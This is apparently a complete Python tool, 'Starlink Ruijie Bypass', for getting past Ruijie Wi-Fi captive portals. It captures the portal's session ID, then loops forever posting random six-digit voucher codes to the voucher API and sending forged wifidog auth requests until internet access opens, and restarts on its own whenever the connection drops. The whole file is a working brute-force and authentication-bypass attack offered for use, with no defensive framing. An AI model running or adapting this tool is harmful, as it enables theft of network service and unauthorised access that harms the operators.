import requests
import re
import time
import random
import string
from urllib.parse import urlparse, parse_qs, urljoin
import urllib3

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Config:
    TEST_URL = "http://connectivitycheck.gstatic.com/generate_204"
    # Ruijie Common API Patterns
    VOUCHER_API = "/api/auth/voucher/"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 10; Termux) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"

class RuijieBypassFixed:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": Config.USER_AGENT})
        self.sid = None
        self.portal_host = None
        self.gw_addr = None
        self.gw_port = None

    def check_internet(self):
        """Check if internet is active."""
        try:
            r = requests.get(Config.TEST_URL, timeout=5)
            return r.status_code == 204
        except:
            return False

    def detect_portal(self):
        """Detect captive portal and extract info."""
        print("[*] Detecting Captive Portal...")
        try:
            r = self.session.get(Config.TEST_URL, allow_redirects=True, timeout=10)
            if r.url == Config.TEST_URL:
                return False, "Internet is already active."
            
            portal_url = r.url
            parsed_url = urlparse(portal_url)
            self.portal_host = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            params = parse_qs(parsed_url.query)
            self.gw_addr = params.get('gw_address', [None])[0]
            self.gw_port = params.get('gw_port', [None])[0]
            
            print(f"[✓] Portal Detected: {self.portal_host}")
            return True, portal_url
        except Exception as e:
            return False, str(e)

    def extract_sid(self, portal_url):
        """Extract Session ID (sid)."""
        print("[*] Extracting Session ID...")
        try:
            r1 = self.session.get(portal_url, verify=False, timeout=10)
            
            js_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            if js_match:
                next_url = urljoin(portal_url, js_match.group(1))
                r1 = self.session.get(next_url, verify=False, timeout=10)

            query_params = parse_qs(urlparse(r1.url).query)
            self.sid = query_params.get('sessionId', [None])[0]
            
            if not self.sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r1.text)
                if sid_match:
                    self.sid = sid_match.group(1)

            if self.sid:
                print(f"[✓] Session ID Captured: {self.sid}")
                return True
            else:
                return False
        except Exception as e:
            print(f"[!] SID Extraction Error: {e}")
            return False

    def login_with_voucher(self, voucher=None):
        """Attempt bypass."""
        if not self.sid:
            print("[!] No Session ID found.")
            return False

        if not voucher:
            voucher = "".join(random.choices(string.digits, k=6))
        
        print(f"[*] Attempting Bypass with Voucher/Token: {voucher}")
        
        try:
            api_url = f"{self.portal_host}{Config.VOUCHER_API}"
            payload = {"accessCode": voucher, "sessionId": self.sid, "apiVersion": 1}
            res = self.session.post(api_url, json=payload, timeout=10)
            print(f"[*] API Response: {res.status_code}")
        except:
            pass

        if self.gw_addr and self.gw_port:
            auth_link = f"http://{self.gw_addr}:{self.gw_port}/wifidog/auth?token={self.sid}&phonenumber=12345"
            print(f"[*] Sending Auth Pulse to: {self.gw_addr}")
            try:
                self.session.get(auth_link, timeout=5)
            except:
                pass

        time.sleep(2)
        if self.check_internet():
            print("[✓] BYPASS SUCCESSFUL!")
            return True
        else:
            print("[✗] Bypass Failed.")
            return False

    def run(self):
        print("--- Starlink Ruijie Bypass (Continuous Monitoring Mode) ---")
        print("Press 'Ctrl + C' to stop the script.\n")
        
        while True:
            # Step 1: Monitor Internet Connection
            if self.check_internet():
                print("\n[✓] Internet is Active. Monitoring connection...")
                while self.check_internet():
                    time.sleep(10)  # အင်တာနက်ရနေပါက ၁၀ စက္ကန့်တစ်ခါ ဆက်စစ်နေမည်
                print("\n[!] Connection lost! Restarting bypass process...")

            # Step 2: Detect Portal
            success, portal_url = self.detect_portal()
            if not success:
                print(f"[!] {portal_url} Retrying in 5 seconds...")
                time.sleep(5)
                continue

            # Step 3: Extract SID and Loop Bypass Attempts
            if self.extract_sid(portal_url):
                attempt = 1
                while True: # Bypass အောင်မြင်သည်အထိ ဆက်တိုက်ကြိုးစားမည်
                    print(f"\n[Attempt {attempt}]")
                    if self.login_with_voucher():
                        break # အောင်မြင်သွားပါက အပေါ်ဆုံး Monitoring အဆင့်သို့ ပြန်သွားမည်
                    time.sleep(3)
                    attempt += 1
            else:
                print("[!] Could not capture Session ID. Retrying in 5 seconds...")
                time.sleep(5)

if __name__ == "__main__":
    engine = RuijieBypassFixed()
    try:
        engine.run()
    except KeyboardInterrupt:
        print("\n[!] Script Stopped by user.")
